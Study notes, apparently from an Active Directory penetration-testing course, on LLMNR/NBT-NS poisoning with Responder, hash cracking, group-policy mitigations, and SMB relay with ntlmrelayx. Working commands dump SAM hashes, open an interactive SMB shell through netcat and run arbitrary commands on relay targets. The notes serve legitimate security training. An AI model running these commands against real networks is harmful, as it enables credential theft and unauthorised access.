
#### LLMNR (Link Local Multicast Name Resolution) Poisoning ( #LLMNR):

- Used to identify hosts when DNS fails to do so.
- Previously known as NBT-NS
- Key flaw is that the services utilize a user's username and NTLMv2 hash when appropriately responded to
- Overview of LLMNR attack:
	- The victim/target machine is asking the server to connect the victim to \\hackm, and also server doesn't have the idea of the path, responds back with no details
	- The victim/target then broadcasts/multicast to everyone asking to help with the connection of \\hackm.
	- Hacker can intercept this request and responds to victim requesting the hash to connect to \\hackm.
	- As victim machine provides the hash, hacker can try to hack the hash and use it for unethical use cases.
- Process for the LLMNR poisoning:
	- Step 1: Run Responder
		- syntax: `sudo responder -I eth0 -dwPv`
			- -I is interface, if its a VPN, it will be tun0 (Tunnel0)
				- if its a network, it will be eth0
			- -d this is for DHCP
			- -w this is for wpad (Start the WPAD rogue proxy server.)
			- -P this is for ProxyAuth (Froce NTLM authentication for the proxy)
			- v - Verbosity
			- Both w and P cannot be used at the same.
		- Syntax: `sudo responder --help` this can be used for more details about the responder.
	- Step 2: Wait for an event to occur, where the victim tries to connect to a shared path
	- Step 3: Responder picks the Hash from victim 
	- Step 4: Crack the hashes with hashcat #HASHCat if its weak.
	
#### LLMNR Poisoning Mitigation ( #LLMNR ):

- The best defense is to disable LLMNR and NBT-NS.
	- To disable LLMNR, select "Turn OFF Multicast Name Resolution" under Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client in the Group Policy Editor. (This can be done in the AD DS server for a domain)
	- To disable NBT-NS, navigate to Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced tab > WINS tab and select "Disable NetBIOS over TCP/IP".
- If a company must use or cannot disable LLMNR/NBT-NS, the best course of action is to:
	- Require Network Access Control.
	- Require strong user passwords (e.g > 14 characters in length and limit common word usage.) The more complex and long the password, the harder it is for an attacker to crack the hash.

#### SMB Relay Attack ( #SMB ):

- What is SMB relay:
	- Instead of cracking hashes gathered with responder, we can instead relay those hashes to specific machines and potentially gain access.
	- Requirements:
		- SMB signing must be disabled or not enforced on the target
		- Relayed user credentials must be admin on machine for any real value
- To check the hosts without SMB Signing:
	- Syntax with nmap:
		- `nmap --script=smb2-security-mode.nse -p445 {ip-address} -Pn` 
		- `nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24 -Pn`
			- -p445 is for port 445 for SMB
			- -Pn is used to force the probing, if not provided results may say that the hosts is down, using -Pn will force the  script to run, even though the ping option is not available
	- If the output contains with the text `Message signing enabled but not required` that means the machine doesn't have SMB signing
- Steps for SMB relay:
	- Step1: Update the responder conf in the path /etc/responder/Responder.conf with the below command.
		- `sudo mousepad /etc/responder/Responder.conf` and update the SMB and HTTP (Servers to start) to Off and save the file.
	- Step2: Run the responder with the below syntax:
		- `sudo responder -I eth0 -dwPv`
	- Step3: Setup your relay with the tool `ntlmrelayx.py`
		- Syntax: `sudo ntlmrelayx.py -tf targets.txt -smb2support`
			- -tf - target file
		- targets.txt will contain the target details that is identified in the nmap scan for SMB signing is disabled.
	- Step4: An event occurs similar to LLMNR access a file share path from the target machine
	- Step5: ntlmrelayx will be dumping the SAM hashes of the users of the target machine.
	- Step6: (Optional) This is the step3 optional, where we add a -i to the end of the command, to enable a interactive shell on a port instead of dumping the SAM hashes
		- `sudo ntlmrelayx.py -tf targets.txt -smb2support -i`
		- Once the event occurs, we will observed that the relayx started a interactive SMB client shell via TCP on 127.0.0.1:11001
		- We can use netcat to listen to the port and access the shell
			- `nc 127.0.0.1 11001`
	- Step7: (Optional) This is the step3 optional, similar to Step6, we can add -c to run any command instead of the shell as well.
		- `sudo ntlmrelayx -tf targets.txt -smb2support -c "whoami"`

- Note: Make sure that the user from machine1 is added in the administration group of the machine2, in order for the SMB relay to work, as if the user is not part of the administrative group, relay attack is not possible
	- And also if the user from machine1 is already added, but for some case, is not showing up in the administrative group policy, start the domain controller and then check once, if not try to add the user again into the machine2.




